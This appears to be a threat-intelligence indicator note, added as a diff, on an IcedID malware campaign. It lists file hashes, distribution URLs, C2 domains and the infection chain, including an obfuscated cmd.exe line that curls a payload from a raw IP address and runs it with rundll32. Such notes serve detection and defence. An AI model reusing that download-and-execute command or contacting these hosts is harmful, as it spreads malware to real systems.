@@ -1,0 +1,43 @@
+IcedID | 16.10.2023 | Campaign 1180344712
+
+***************************************
+
+.zip 1f0422c7c9b37bdde2f5404eb72d22fc97672f85bad6fcdff29b052598f39337 
+.js 67fd74add9de8de8b4006ee023cd9afe78c913cfac176bf9664de8a90fc1ac4f
+.exe 82a01607ebdcaa73b9ff201ccb76780ad8de4a99dd3df026dcb71b0f007456ed
+
+***************************************
+
+Exec >>
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\E-43.js
+
+cmd.exe /c wO || EcHO wO & PIng wO || CuRl http://89.147.111.46/gWUA/amalg -o %tmP%\wO.log & PIng -n 2 wO || RUNdLL32 %tmP%\wO.log scab /k haval462 & exiT tHyhIPeiwLU
+
+PIng wO 
+
+PIng -n 2 wO 
+
+RUNdLL32  C:\Users\Admin\AppData\Local\Temp\wO.log scab /k haval462
+
+***************************************
+
+.zip distro
+
+.dll distro
+
+http://89.147.111.46/gWUA/amalg
+http://198.98.61.173/Ftn/level
+
+***************************************
+
+c2 downloader
+
+http://aptekoagraliy.com/
+
+c2's
+
+joekairbos.com/news/
+seedkraproboy.com/news/
+
+***************************************
